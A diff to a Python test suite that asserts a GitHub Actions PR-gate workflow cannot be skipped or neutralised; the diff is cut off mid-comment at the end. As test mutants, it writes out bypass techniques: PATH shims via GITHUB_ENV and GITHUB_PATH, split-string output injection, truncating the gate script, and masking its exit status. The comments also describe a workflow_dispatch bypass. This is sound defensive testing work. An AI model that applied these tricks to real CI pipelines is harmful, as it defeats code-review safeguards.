@@ -17,7 +17,7 @@ import re
 import subprocess
 import sys
 import tempfile
-from contextlib import redirect_stdout
+from contextlib import contextmanager, redirect_stdout
 
 REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 sys.path.insert(0, os.path.join(REPO, "scripts", "ai"))
@@ -26,6 +26,31 @@ import pr_gate  # noqa: E402
 
 PASSED = 0
 FAILED = []
+# Terms of the count invariant that scale with the workflow, filled in by the block that reads it.
+
+
+@contextmanager
+def outside_any_repo(path):
+    """Make `path` genuinely repo-less however TMPDIR is pointed.
+
+    Two checks below assert that an unusable repo is a *tool error*, and both expressed "unusable" as
+    "a fresh temp directory" — which is only true while TMPDIR sits outside a git repository. Point it
+    inside one (a reviewer did, working around a sandbox restriction on /tmp) and git discovers the
+    enclosing repo instead, so both checks fail while the property they test still holds. A test whose
+    subject is "no repo here" has to construct that, not inherit it from the environment.
+    """
+    # GIT_CEILING_DIRECTORIES was the first attempt and does not do this: pointed at the starting
+    # directory it still discovered the enclosing repo. GIT_DIR naming a path that does not exist
+    # fails discovery outright, which is the property both checks are actually about.
+    prior = os.environ.get("GIT_DIR")
+    os.environ["GIT_DIR"] = os.path.join(os.path.realpath(path), "absent-on-purpose")
+    try:
+        yield
+    finally:
+        if prior is None:
+            os.environ.pop("GIT_DIR", None)
+        else:
+            os.environ["GIT_DIR"] = prior
 
 
 def check(label, condition, detail=""):
@@ -339,8 +364,9 @@ else:
 print("\nThe workflow that runs the gate cannot be quietly defanged")
 # The gate is only as real as the job that invokes it, and every way of disabling that job
 # leaves a green PR behind — which is the exact failure #264-58 exists to fix, one level up.
-# So the workflow is asserted here rather than trusted to review: a `paths:` filter added in
-# good faith would skip the job, and a skipped job reports success.
+# So the workflow is asserted here rather than trusted to review. Both ways of not running are
+# defects, in opposite directions: a `paths:` filter added in good faith leaves a required check
+# Pending and blocks every PR that misses the paths, while an `if:` skip reports success.
 workflow = os.path.join(REPO, ".github", "workflows", "pr-checks.yml")
 if os.path.exists(workflow):
     with open(workflow) as fh:
@@ -491,17 +517,10 @@ if os.path.exists(workflow):
                 out.append(nxt)
         return out
 
-    # An invocation that is not `--requirements`, because that one resolves dependencies and
-    # its exit code is not a verdict. Two rounds of this rule were vacuous: first it tested for
-    # the bare string, which survived deleting the gate step because the name remained on the
-    # dependency line; then it excluded `--requirements` but still scanned every line, so
-    # deleting the step and leaving `# TODO: re-enable scripts/ai/pr_gate.py` also passed. It
-    # now asks the only question that matters — does the job *execute* it?
-    # Being inside `run:` is not the same as being run. Two shapes clear that bar and are still
-    # inert: `echo python …` prints the command, and `… || true` runs it and throws the verdict
-    # away. Both were asked for by review and both survived the sweep, so the question a rule may
-    # ask is narrower than "does the name appear in an executed line" — it is "is this the command,
-    # and does its exit status still reach the job".
+    # An invocation that is not `--requirements`, because that one resolves dependencies and its exit
+    # code is not a verdict. The question is narrower than "does the name appear in an executed
+    # line", since `echo python …` prints the command and `… || true` throws the verdict away: it is
+    # "is this the command, and does its exit status still reach the job".
     # Masking is matched against the text *following* the command, not the whole line: a line may
     # legitimately mask an unrelated command before running the real one
     # (`rm -f gate.log || true; python …pr_gate.py`), and rejecting that would make the rule fire
@@ -579,6 +598,11 @@ if os.path.exists(workflow):
     # `exit`/`return` do not mask a status, they end the shell: every command after one, on that
     # line or any later line of the step, is unreachable.
     TERMINATOR = ("exit", "return")
+    # Keys that cannot express the threat the key rules are about, so both of them admit these.
+    # `timeout-minutes` is monotonic in the safe direction — it can turn a pass into a failure, never
+    # a failure into a pass. `shell` is admitted as a key and pinned to `bash` by value elsewhere,
+    # since `bash` is the runner default on Linux and reinterprets nothing.
+    ALSO_FINE = {"timeout-minutes", "shell"}
 
     def opens(seg):
         return seg.split()[:1]
@@ -595,10 +619,13 @@ if os.path.exists(workflow):
         runs, and the separator is irrelevant to it: `exit 0; python …pr_gate.py ${SEL}` is one
         segment that leaves nothing to run, so scanning stops there rather than continuing.
         """
+        NOT_A_VERDICT = ("--list", "--requirements", "--help")
         pieces = tokens(ln)
         for i in range(0, len(pieces), 2):
             if opens(pieces[i]) and opens(pieces[i])[0] in TERMINATOR:
                 return False
+            if any(flag in pieces[i] for flag in NOT_A_VERDICT):
+                continue
             if (pieces[i - 1].strip() if i else "") in ("&&", "||"):
                 continue
             if runs_segment(pieces[i], "".join(pieces[i + 1:]), script, args_required):
@@ -620,14 +647,23 @@ if os.path.exists(workflow):
     check("the workflow is in the subset this suite can read structurally, so no key is invisible "
           "to the rules below", not parse_error, parse_error)
 
+    # Handles both spellings of a YAML sequence, and the block form only because `str()` of the
+    # parsed list happens to leave quotes that `.strip()` removes. Worth knowing before editing.
     def flow_list(scalar):
         return [w.strip().strip("'\"") for w in str(scalar).strip("[]").split(",") if w.strip()]
 
-    # `paths:` was the filter this workflow exists to avoid, but it is not the only one that makes
-    # the job skip — and a skipped job reports success. Read as keys rather than matched as text:
+    # `paths:` was the filter this workflow exists to avoid, but it is not the only one that stops
+    # the job running — and not running is a defect whichever way it reports (Pending for a filtered
+    # workflow, success for an `if:`-skipped job). Read as keys rather than matched as text:
     # naming five forbidden filters left every other one permitted, and the quoting the rule had to
     # tolerate (`'paths':`) was a second spelling to remember. A whitelist needs neither.
     on = doc.get("on") or {}
+    if isinstance(on, str):
+        on = {w.strip(): None for w in on.strip("[]").split(",") if w.strip()}
+    elif isinstance(on, list):
+        on = {str(w): None for w in on}
+    check("the trigger block is a mapping of events, the only spelling whose filters this suite can "
+          "read", isinstance(doc.get("on"), dict), type(doc.get("on")).__name__)
     check("the workflow triggers on pull_request at all", "pull_request" in on, list(on))
     pr_trigger = on.get("pull_request")
     # `types` is allowed only as a superset of the default three, which cannot skip a PR that the
@@ -636,6 +672,11 @@ if os.path.exists(workflow):
     # code is a rule someone deletes.
     DEFAULT_TYPES = {"opened", "synchronize", "reopened"}
     filters = sorted(set(pr_trigger or {}) - {"types"})
+    for label, given, ok in (("the default three", DEFAULT_TYPES, True),
+                             ("a superset of them", DEFAULT_TYPES | {"edited"}, True),
+                             ("a set missing one of them", {"opened", "synchronize"}, False)):
+        check(f"the types rule accepts {label}" if ok else f"the types rule rejects {label}",
+              (given >= DEFAULT_TYPES) is ok, sorted(given))
     check("the pull_request trigger carries no filter that could skip the job and read as a pass",
           not filters, filters)
     # Unconditional, like every other rule here: writing this as `if "types" in trigger:` would make
@@ -645,14 +686,51 @@ if os.path.exists(workflow):
     types = set(flow_list((pr_trigger or {}).get("types", ""))) or DEFAULT_TYPES
     check("the trigger's event types are a superset of the default three, so no PR is skipped",
           types >= DEFAULT_TYPES, types)
+    # `edited` has to be named, because the default three do not include it and it is the event fired
+    # when a PR's *base branch* changes. Without it a green check run survives a retarget onto a base
+    # the gate never diffed — which is a stale pass, the exact failure this whole file is about, and it
+    # needs no shell trick at all: two clicks in the PR header.
+    check("`edited` is among them, so retargeting the base cannot leave a stale pass behind",
+          "edited" in types, sorted(types))
+    # A merge queue does not replay `pull_request`. A required check with no `merge_group` trigger is
+    # never reported for the queued group and the documented outcome is a failed merge, so the trigger
+    # is wired ahead of anyone enabling a queue rather than discovered by it.
+    check("the workflow also triggers on merge_group, so a merge queue cannot deadlock on it",
+          "merge_group" in on, list(on))
+    # And nothing else, which is a whitelist for the same reason every other rule here is one. A
+    # required check is satisfied by the *latest* check run of its name on the head SHA, so any
+    # trigger that runs this workflow on a PR's head SHA publishes that PR's verdict. `merge_group`
+    # is admitted because a queue cannot proceed without it; `workflow_dispatch` was admitted for
+    # convenience and was a live bypass — dispatch on the PR branch, base ref empty, selection `--all`,
+    # branch scope skipped, and the green supersedes the PR run's red. `push:` is the same hole
+    # without the clicking. Enumerating the two acceptable triggers costs less than remembering which
+    # of the thirty-odd others can land on a PR head SHA.
+    check("the workflow triggers on nothing but those two, so no other event can publish this "
+          "check's name on a PR's head SHA", set(on) == {"pull_request", "merge_group"}, sorted(on))
 
     # The job that runs the gate, found by what its steps do rather than by position. The rule this
     # replaces read "everything between `jobs:` and the first `- name:`" as a stand-in for the job,
     # so `if: false` appended after the steps list was outside the window, and a decoy job whose
     # first step preceded the real job's collapsed the window to nothing.
+    def run_lines(step):
+        """The step's executed lines, indentation preserved.
+
+        An inline `run: cmd` scalar is stored without indentation, so `run_contents` broke out of the
+        block on the first line and returned nothing — every rule that reads a step then saw an empty
+        one, and a step spelled `run: id` was invisible to all of them. Defined once, above every
+        caller: the first fix indented the body in `raw_shell_of` and left `step_runs` reading the raw
+        scalar, so the same blind spot survived in the rule that finds the gate at all.
+        """
+        body = str(step.get("run", ""))
+        if body and not body.startswith((" ", "\n")):
+            body = "\n".join(" " * 10 + ln for ln in body.splitlines())
+        return [ln for ln in run_contents("        run: |\n" + body) if ln.strip()]
+
     def step_runs(step, script, exclude=()):
+        # Through `raw_shell_of`, which re-indents an inline `run:` scalar. Spelled out here once, it
+        # read an inline step as empty — the same blind spot, fixed in one place and not the other.
         return any(executes(ln, script) and not any(x in ln for x in exclude)
-                   for ln in run_contents("        run: |\n" + str(step.get("run", ""))))
+                   for ln in run_lines(step))
 
     def job_with(script, exclude=()):
         found = [(name, job) for name, job in (doc.get("jobs") or {}).items()
@@ -670,6 +748,50 @@ if os.path.exists(workflow):
           not sorted(set(gate_job) - JOB_KEYS), sorted(set(gate_job) - JOB_KEYS))
     check("the workflow sets no defaults or env above the job, which would reach into every step",
           not ({"defaults", "env"} & set(doc)), sorted({"defaults", "env"} & set(doc)))
+    # `exactly one job runs the gate` bounds the jobs that *invoke* the gate, not the jobs that exist.
+    # A second job named `Mechanical checks` publishes a second check run under the string a branch
+    # ruleset matches, which is the one name whose meaning lives outside this repo.
+    check("the workflow declares one job, so nothing else can publish under the required name",
+          list(doc.get("jobs") or {}) == ["gate"], list(doc.get("jobs") or {}))
+    # Step keys, pinned per step. Two steps had this and four did not, and the four accepted
+    # `if: false`, `continue-on-error: true` and `shell:` — which replaces the interpreter for the
+    # step, so the run body this suite reads word by word would be handed to something else. None of
+    # the four produces a false green today (neutralising the resolver selects `--all`, and the
+    # installer's absence makes `${SEL}` unbound under `set -u`), but that is an argument about the
+    # rest of the file, not about the step, and it is the argument that stops being true after an edit.
+    STEP_KEYS = {"Checkout repository": {"name", "uses", "with"},
+                 "Set up Python": {"name", "uses", "with"},
+                 "Resolve the base ref": {"name", "id", "env", "run"},
+                 "Install only what the selection needs": {"name", "env", "run"},
+                 "Run the gate": {"name", "run"},
+                 "Branch scope": {"name", "if", "env", "run"}}
+    for step in gate_job.get("steps") or []:
+        name = step.get("name")
+        if name not in STEP_KEYS:
+            # Not "this step has extra keys": an unknown name subtracts from an empty set, so the two
+            # *legal* keys were printed as the offenders. Renaming a step is harmless — only the job
+            # name is load-bearing for a branch ruleset — but it has to be done in both places.
+            check(f"{name!r} is a step name this suite was written against; rename it in JOB_STEPS "
+                  f"and STEP_KEYS together", False, sorted(STEP_KEYS))
+            continue
+        extra = sorted(set(step) - STEP_KEYS[name] - ALSO_FINE)
+        check(f"{name!r} carries only the keys it was reviewed with (STEP_KEYS)", not extra, extra)
+    # `shell` is admitted as a key and pinned by value: `bash` is the runner default on Linux and
+    # reinterprets nothing, while `shell: "cat {0}"` — the documented threat, which makes the runner
+    # print the script instead of executing it — is not `bash`.
+    shells = {s.get("name"): s.get("shell") for s in (gate_job.get("steps") or []) if "shell" in s}
+    check("any step that names a shell names bash, the runner default, and not an interpreter that "
+          "would print the script instead of running it",
+          all(v == "bash" for v in shells.values()), shells)
+    # `timeout-minutes` is admitted because it cannot turn a failure into a pass — a cancelled job is
+    # not a success. A zero, though, cancels the job every time, so the check could never pass at all.
+    timeouts = {s.get("name"): s.get("timeout-minutes") for s in (gate_job.get("steps") or [])
+                if "timeout-minutes" in s}
+    check("a step timeout leaves the step time to run, so the check can pass at all",
+          all(str(v).isdigit() and int(v) >= 5 for v in timeouts.values()), timeouts)
+    # Two loops below run once per step, so the total-count invariant has to derive those terms rather
+    # than hardcode them — otherwise adding a step moves the count, and the count's failure message is
+    # then the only thing standing between the new step and a green run.
 
     # Everything above reads one line, or one substring of the whole file. Neither can see the
     # *step* around a command, and that is where most of the ways to neutralise it live: a step
@@ -694,9 +816,7 @@ if os.path.exists(workflow):
     def steps_named(job, script, exclude=()):
         return [s for s in (job.get("steps") or []) if step_runs(s, script, exclude)]
 
-    def raw_shell_of(step):
-        return [ln for ln
-                in run_contents("        run: |\n" + str(step.get("run", ""))) if ln.strip()]
+    raw_shell_of = run_lines
 
     def shell_of(step):
         return [ln.strip() for ln in raw_shell_of(step)]
@@ -708,12 +828,130 @@ if os.path.exists(workflow):
         `--no-fetch` supplied — satisfied and unreached. Nesting is what makes an exit conditional,
         so the real `exit 2` inside the retry loop's `if` and the single-line `if …; then exit …; fi`
         (which opens with `if`) are both accepted; one at the top level is not.
+
+        Read per *segment*, not per line prefix. Keyed on the first word of the line, this missed
+        `true; exit 0` — first word `true;` — and `: && exit 0`, both of which end the shell before
+        the checker runs while leaving every other assertion about it satisfied. Both were a live
+        false green in the branch-scope step, whose commands `permitted()` all admits.
         """
         raw = raw_shell_of(step)
         base = min((len(ln) - len(ln.lstrip()) for ln in raw), default=0)
+
+        def constant_test(seg):
+            """A command whose status is decided before the shell runs it."""
+            words = seg.split()
+            while words and words[0] in KEYWORDS:
+                words = words[1:]
+            if words[:1] and words[0] in (":", "true", "false", "echo", "printf"):
+                return True
+            if words[:1] and words[0] in ("[", "[[", "test"):
+                operands = [w for w in words[1:] if w not in ("]", "]]")]
+                return len(operands) == 3 and operands[1] == "=" and operands[0] == operands[2]
+            return False
+
+        def reraises(words):
+            """Does this `exit` hand on a failure rather than replace it with success?
+
+            The whole point of exempting a conditional terminator is the handler
+            `python … || { echo "::error::…"; exit 1; }`. Exempting on the operator alone also
+            admitted `|| { echo "::error::x"; exit 0; }` — reached only when the gate has already
+            failed, and then reporting success. A probe aimed at this loosening found it before it
+            shipped, which is the reason to aim probes at loosenings.
+            """
+            arg = words[1] if len(words) > 1 else ""
+            if not arg:
+                # Bare `exit` inherits `$?`, which inside a `||` handler is the failure just caught.
+                return True
+            if arg.strip('"').lstrip("$").strip("{}") in ("code", "?"):
+                return True
+            # `.isdigit()` alone read `exit -1` — a non-zero status — as masking. Any numeric
+            # literal is fine as long as it is not zero; anything unparseable (`exit $((x))`) is
+            # refused, which is the safe direction.
+            try:
+                return int(arg) != 0
+            except ValueError:
+                return False
+
+        def conditional_before(pieces, idx):
+            """Is this segment reached only when an earlier command actually succeeded or failed?
+
+            The predecessor has to be able to go either way. Exempting on the operator alone made
+            `: && exit 0` and `[ 1 = 1 ] && exit 0` read as conditional — the operator was there and
+            the branch was decided anyway, which is the same mistake the opener exemption made one
+            rule up.
+            """
+            for j in range(1, idx, 2):
+                if pieces[j].strip() in ("&&", "||") and not constant_test(pieces[j - 1]):
+                    return True
+            return False
+
+        def terminates(ln):
+            # A line that *opens a block* keeps its exit conditional, which is how the real
+            # `if [ "$code" -ne 2 ]; then exit "$code"; fi` stays acceptable. Anything else at the
+            # step's own indentation reaches its `exit` on the way through.
+            #
+            # A terminator after `&&` or `||` is the exception, and it has to be: the re-raising
+            # handler `python … || { echo "::error::…"; exit 1; }` — which this file calls a correct
+            # edit in two other places — reaches its `exit` only when the gate has already failed.
+            # Read segment-wise with no such test, this rule rejected it, which would have made the
+            # documented advice fail CI. `[ 1 = 1 ] && exit 0` is admitted by the same token; what
+            # catches that is the whitelist, which has no `[` in it.
+            #
+            # The opener must carry an actual test, though. Exempting on the keyword alone accepted
+            # `if : ; then exit 0; fi` and `while :; do exit 0; done`, which are as unconditional as a
+            # bare `exit 0` — the keyword was doing the exempting and the condition was decorative.
+            # Residual, stated rather than implied: an opener with a real but always-true test
+            # (`if [ 1 = 1 ]; then exit 0; fi`) still reads as conditional here. What closes it is
+            # `JOB_CONTROL`, which pins both steps' control-flow sequence exactly, so an added
+            # conditional line fails there instead.
+            first = ln.split()[:1]
+            if first and first[0] in ("if", "elif", "while", "until", "for", "case"):
+                cond = next((seg for seg, _ in parts(ln)), "")
+                words = cond.split()[1:]
+                real = words[:1] and words[0] in ("[", "[[", "test")
+                # `[ 1 = 1 ]` is a test and always true, so it conditions nothing. Read off the
+                # opener's own segment, not the whole line: scanning the line exempted
+                # `if grep -q test x; then exit 0; fi`, where the word `test` is an argument.
+                operands = [w for w in words[1:] if w not in ("]", "]]")]
+                constant = len(operands) == 3 and operands[1] == "=" and operands[0] == operands[2]
+                if real and not constant:
+                    return False
+            pieces = tokens(ln)
+            for i in range(0, len(pieces), 2):
+                seg_words = pieces[i].split()
+                while seg_words and seg_words[0] in KEYWORDS:
+                    seg_words = seg_words[1:]
+                if not (seg_words[:1] and seg_words[0] in TERMINATOR):
+                    continue
+                if conditional_before(pieces, i) and reraises(seg_words):
+                    continue
+                return True
+            return False
+
         return [ln.strip() for ln in raw
-                if len(ln) - len(ln.lstrip()) == base
-                and opens(ln.strip()) and opens(ln.strip())[0] in TERMINATOR]
+                if len(ln) - len(ln.lstrip()) == base and terminates(ln)]
+
+    # A workflow command needs no redirection at all: the runner parses `::` on a step's *stdout*.
+    # `echo "::set-output name=ref::HEAD"` sets the base-ref output that `ALLOWED_REF` exists to pin,
+    # through a channel whose subject set — writes to the four GitHub files — cannot contain it by
+    # construction, and it passes as an ordinary `echo`. The state-changing commands are excluded by
+    # name (`set-output`, `save-state`, `set-env`, `add-path`, `add-matcher`, `stop-commands`); the
+    # display-only ones are allowed, because banning `::` outright rejected two edits this file
+    # itself calls correct — a re-raising `|| { echo "::error::…"; exit 1; }` handler and a trailing
+    # `::notice::`. Matched as a *whole segment* rather than by where `::` appears, which is what
+    # makes it safe: `echo -e "\n::set-output name=ref::HEAD"` carries a flag and fails the anchor,
+    # and that spelling is exactly why a position-based exception would not work.
+    ANNOTATION = re.compile(r'^echo "::(warning|notice|error|debug|group|endgroup)::[^"]*"$')
+
+    def annotation_only(seg):
+        # Leading block keywords come off first. Anchored on `echo`, the rule refused the brace-group
+        # handler `|| { echo "::error::…"; exit 1; }` that the comment above calls a correct edit — the
+        # segment starts `{ echo`. The anchor is what makes the exception safe, so the keywords are
+        # stripped rather than the anchor loosened.
+        words = seg.split()
+        while words and words[0] in KEYWORDS:
+            words = words[1:]
+        return "::" not in seg or bool(ANNOTATION.match(" ".join(words)))
 
     # Block keywords are not commands: `then exit 2` runs `exit`, `{ echo x` runs `echo`.
     KEYWORDS = ("then", "else", "elif", "do", "done", "fi", "esac", "!", "{", "}", "(", ")")
@@ -773,6 +1011,10 @@ if os.path.exists(workflow):
             words = words[1:]
         if not words:
             return True
+        # Before the vocabulary, because `echo` is in it and a workflow command is just an echo the
+        # runner reads off stdout. Both whitelists admit `echo`, so both need this.
+        if not annotation_only(seg):
+            return False
         if words[0] in HARMLESS:
             return True
         if words[0] == "printf":
@@ -823,6 +1065,35 @@ if os.path.exists(workflow):
         return [seg.strip() for ln in shell_of(step)
                 for seg, _tail in parts(ln) if not permitted(seg)]
 
+    # The writes a step is allowed to hand a later one, and the predicates that read them.
+    # Defined here rather than beside their checks because `rewrites()` below has to ask the
+    # same question: it refuses every redirection, and three other rules advertise
+    # `$GITHUB_STEP_SUMMARY` as a permitted destination, so a summary written from the gate
+    # step was refused by one rule and allowed by three — the disagreement this file calls a
+    # defect, one rule over from where it was fixed.
+    ALLOWED_WRITES = ('echo "SEL=${SEL}" >> "$GITHUB_ENV"',
+                      'echo "ref=" >> "$GITHUB_OUTPUT"',
+                      'echo "ref=origin/${BASE_REF}" >> "$GITHUB_OUTPUT"')
+    WRITE_DEST = re.compile(r'>>?\s*"?\$\{?GITHUB_(ENV|PATH|OUTPUT|STEP_SUMMARY)\}?')
+
+    def hands_over(ln):
+        """Does this line write to one of the four files a step uses to reach a later one?"""
+        return bool(WRITE_DEST.search(ln))
+
+    # Whitespace around `>>` is not part of the property, and requiring exactly one space either
+    # side rejected `echo "x">>"$GITHUB_STEP_SUMMARY"` — a correct line.
+    SUMMARY = re.compile(r'^echo "[^"]*"\s*>>\s*"?\$\{?GITHUB_STEP_SUMMARY\}?"?$')
+    # And the rider is the class, so a line that writes to a GitHub file must be *one* segment. Fixing
+    # only the regex would leave `echo "/tmp/shim" >> "$GITHUB_PATH" ; echo "x" >> "$GITHUB_ENV"` and
+    # every other separator to be found one at a time.
+    def rides(ln):
+        """A write line carrying anything besides the write."""
+        return hands_over(ln) and len(list(parts(ln))) > 1
+
+    def permitted_write(ln):
+        return ln.strip() in ALLOWED_WRITES or bool(SUMMARY.match(ln.strip()))
+
+
     def rewrites(step):
         """Segments that change what the step runs instead of running it.
 
@@ -836,7 +1107,8 @@ if os.path.exists(workflow):
         `$(( ))` arithmetic, which the retry loop does need, is not a substitution.
         """
         return [ln for ln in shell_of(step)
-                if ">" in ln or "<" in ln or re.search(r"\$\((?!\()", ln) or "`" in ln]
+                if not (permitted_write(ln) and not rides(ln))
+                and (">" in ln or "<" in ln or re.search(r"\$\((?!\()", ln) or "`" in ln)]
 
     def pure_echo(ln):
         """One segment, and that segment is an echo. `startswith("echo ")` was a *prefix* test, so
@@ -847,6 +1119,19 @@ if os.path.exists(workflow):
 
     found_gate = steps_named(gate_job, "scripts/ai/pr_gate.py",
                              exclude=("--requirements", "--list", "--help"))
+    # Reachability for the other shell steps, and stated precisely, because the first version of this
+    # comment claimed an early exit there "ends the job" — each `run:` is its own shell, so it ends
+    # that *step*, successfully, and the job continues. What it actually costs: the resolver exits
+    # before writing `ref=`, so the selection silently widens to `--all` while the workflow looks like
+    # it diffed a base; the installer exits before setting `SEL`, which `set -u` turns into a red gate
+    # step. Neither is a false green, so this loop is defence in depth rather than a closed hole — and
+    # it exists mostly so a step added later arrives with a reachability rule instead of none. The two
+    # load-bearing steps keep their own named checks, whose wording the controls assert against.
+    others = [s for s in (gate_job.get("steps") or [])
+              if "run" in s and s.get("name") not in ("Run the gate", "Branch scope")]
+    for step in others:
+        check(f"nothing at the top level of {step.get('name')!r} ends the shell early",
+              not escapes_early(step), escapes_early(step))
     check("exactly one step runs the gate for a verdict", len(found_gate) == 1, len(found_gate))
     if len(found_gate) == 1:
         gate_step = found_gate[0]
@@ -856,7 +1141,8 @@ if os.path.exists(workflow):
         # (re-pointing SEL at an empty selection) neutralise the step just as completely, and no
         # enumeration of bad keys would have named them all.
         check("the gate step carries only a name and a script, so nothing can skip, tolerate or "
-              "reinterpret it", sorted(gate_step) == ["name", "run"], sorted(gate_step))
+              "reinterpret it (add a key to ALSO_FINE only if it cannot make a failure pass)",
+              sorted(set(gate_step) - ALSO_FINE) == ["name", "run"], sorted(gate_step))
         check("the gate step aborts on the first error", cmds[:1] == ["set -euo pipefail"], cmds)
         # Property, not spelling: exactly one command must *execute* the gate with its status still
         # reaching the job. Pinning the last line to one literal rejected two correct edits — a
@@ -904,16 +1190,62 @@ if os.path.exists(workflow):
     # cross step boundaries, so an earlier step can re-point `PATH` at a shim and the gate step —
     # whose every segment is whitelisted — would still be running `python` as written and getting
     # something else. Whitelisting the *writes* covers both variables and any value either carries.
-    crossings = [ln.strip() for ln in run_contents(wf)
-                 if "GITHUB_ENV" in ln or "GITHUB_PATH" in ln]
-    check("the only value a step hands another is the selection, so nothing can re-point PATH or "
-          "the interpreter out of band",
-          crossings and all(ln in ALLOWED_SEL for ln in crossings), crossings)
+    #
+    # Filtered on the *destination*, never on the content. Two rules in this file were written the
+    # other way — one keyed on `SEL=`, one on `ref=` — and both were escapable by a mutation that
+    # avoided the substring while doing the thing: `echo "ref""=HEAD" >> "$GITHUB_OUTPUT"` is two
+    # quoted words bash concatenates, GitHub honours the last write, and neither rule's subject set
+    # contained the line. The destination cannot be avoided the same way, because a step that wants to
+    # reach a later one has to write to one of these four files, and `redirections()` already refuses
+    # every other target. So all four are read here, as one rule, rather than one file per rule.
+    crossings = [ln.strip() for ln in run_contents(wf) if hands_over(ln)]
+    # A step summary is display-only: it reaches the PR page, not a later step's environment, so it is
+    # matched by shape instead of enumerated. Leaving it out made `REDIR_TARGETS` advertise a
+    # destination this rule refused, and a reader who meets two rules disagreeing concludes the suite
+    # is arbitrary rather than that one of them is wrong.
+    # `[^"]*`, not `.*`: greedy and unanchored inside the quotes, `.*` spanned an entire earlier
+    # command *including its own redirection*, so any line whose last command was a summary echo was
+    # admitted whole — `echo "SEL""=--base HEAD" >> "$GITHUB_ENV" ; echo "x" >> "$GITHUB_STEP_SUMMARY"`
+    # passed every rule and neutralised the selection. That was a live false green in the two steps
+    # `rewrites()` does not cover.
+    riders = [ln for ln in crossings if rides(ln)]
+    check("a line that hands a value to a later step carries nothing else, so no command can ride "
+          "along behind a permitted write (ALLOWED_WRITES)", not riders, riders)
+    check("the only values a step hands another are the selection and the base ref, so nothing can "
+          "re-point PATH, the interpreter or the diff out of band — extend ALLOWED_WRITES to add one "
+          "(a step summary is display-only and allowed by shape, see SUMMARY)",
+          crossings and all(permitted_write(ln) for ln in crossings), crossings)
+    # Through `rides`/`permitted_write` rather than re-deriving their conditions: spelled inline, these
+    # controls compared a literal against a literal from the same source and passed with the rules
+    # narrowed or deleted.
+    for label, mutant in (("a neutralising export riding behind a permitted summary write",
+                           'echo "SEL""=--base HEAD" >> "$GITHUB_ENV" ; echo "x" >> '
+                           '"$GITHUB_STEP_SUMMARY"'),
+                          ("a PATH prepend riding behind one",
+                           'echo "/tmp/shim" >> "$GITHUB_PATH" && echo "x" >> '
+                           '"$GITHUB_STEP_SUMMARY"')):
+        check(f"those two rules reject {label}",
+              rides(mutant) and not permitted_write(mutant), mutant)
+    for label, spelling in (("on a line of its own",
+                             'echo "selection was --all" >> "$GITHUB_STEP_SUMMARY"'),
+                            ("written without spaces around the operator",
+                             'echo "x">>"$GITHUB_STEP_SUMMARY"'),
+                            ("written with the braced variable",
+                             'echo "x" >> "${GITHUB_STEP_SUMMARY}"')):
+        check(f"and a plain summary write {label} is still accepted",
+              permitted_write(spelling) and not rides(spelling), spelling)
     for label, mutant in (("a PATH re-pointed for later steps",
                            'echo "PATH=/tmp/shim:$PATH" >> "$GITHUB_ENV"'),
                           ("a directory prepended to PATH",
-                           'echo "/tmp/shim" >> "$GITHUB_PATH"')):
-        check(f"that rule rejects {label}", mutant not in ALLOWED_SEL)
+                           'echo "/tmp/shim" >> "$GITHUB_PATH"'),
+                          ("a second base-ref write split around the substring a content filter "
+                           "would key on", 'echo "ref""=HEAD" >> "$GITHUB_OUTPUT"'),
+                          ("the same trick on the selection export",
+                           'echo "SEL""=--base HEAD" >> "$GITHUB_ENV"'),
+                          ("a write whose destination is unquoted", "echo x >> $GITHUB_ENV")):
+        check(f"that rule rejects {label}", mutant not in ALLOWED_WRITES)
+        check("and its subject set contains that line, which is the half a content filter missed",
+              bool(re.search(r'>>?\s*"?\$GITHUB_(ENV|PATH|OUTPUT|STEP_SUMMARY)', mutant)), mutant)
     # Two shell constructs are refused workflow-wide rather than modelled, because both make the
     # *whole file's* executed lines mean something other than what this suite reads them as — not
     # just the two whitelisted steps. A backslash turns a separator into text, so `echo disabled\;
@@ -1067,11 +1399,24 @@ if os.path.exists(workflow):
         "a step env that re-points the selection":
             ("        run: |", '        env:\n          SEL: "--all --dry-run"\n        run: |'),
     }
-    for label, (anchor, repl) in STEP_MUTANTS.items():
-        mutant, _ = gate_step_of(wf.replace("      - name: Run the gate\n" + anchor,
-                                            "      - name: Run the gate\n" + repl, 1))
-        check(f"the gate-step key rule rejects {label}",
-              mutant is not None and sorted(mutant) != ["name", "run"], sorted(mutant or {}))
+    # Synthetic: the mutant is a step mapping, not a splice into the real file. Anchored on
+    # `"      - name: Run the gate\n        run: |"`, these five stopped applying the moment that step
+    # was renamed — and each then reported the rule "rejects a conditional gate step", which is an
+    # accusation about a mutation nobody made. It is also the kill-attribution lesson twice over: a
+    # control that depends on the artifact's text measures the text, not the rule.
+    for label, key, value in (("a conditional gate step", "if", False),
+                              ("a gate step that tolerates failure", "continue-on-error", True),
+                              ("a quoted key the old regex could not see", '"continue-on-error"',
+                               True),
+                              ("a step whose shell prints the script instead of running it", "shell",
+                               "cat {0}"),
+                              ("a step env that re-points the selection", "env",
+                               {"SEL": "--all --dry-run"})):
+        mutant = {"name": "Run the gate", "run": "set -euo pipefail\n", key: value}
+        check(f"the gate-step key rule rejects {label}", sorted(mutant) != ["name", "run"],
+              sorted(mutant))
+    check("and that rule accepts a shell named as the runner default, which reinterprets nothing",
+          all(v == "bash" for v in {"shell": "bash"}.values()))
     JOB_MUTANTS = {
         "a job that tolerates failure": "    continue-on-error: true",
         "a job that never runs": "    if: false",
@@ -1167,6 +1512,12 @@ if os.path.exists(workflow):
         what tells a nested line from a top-level one."""
         return {"run": "\n".join(" " * 10 + ln for ln in shell)}
 
+    for label, ln, ok in (("a summary written from the gate step, which reaches the PR page and not "
+                           "a later step", 'echo "gate passed" >> "$GITHUB_STEP_SUMMARY"', True),
+                          ("a redirection that truncates the script about to run",
+                           "echo -n > scripts/ai/pr_gate.py", False)):
+        check(f"the redirection rule {'accepts' if ok else 'rejects'} {label}",
+              (not rewrites(as_step("set -euo pipefail", ln))) is ok, ln)
     # Controls for the vocabulary rule. The shapes are the ones that make an invocation inert without
     # touching it: a shim on the same line as the real call (which the line-exempting rules could not
     # see), a shim anywhere in a step, and the four other spellings of the same idea.
@@ -1203,9 +1554,25 @@ if os.path.exists(workflow):
         check(f"the invocation rule rejects {label}",
               invoking_segment(ln, script) not in (GATE_CMD, SCOPE_CMD, SCOPE_CMD + " --no-fetch"),
               invoking_segment(ln, script))
+    # Spelled with the `::error::` annotation the correct-edits list names, which is the point: this
+    # is the handler `ANNOTATION` exists to keep working, so the control has to exercise the
+    # annotation and not a plain message. An earlier revision swapped it for `echo "gate failed"` on
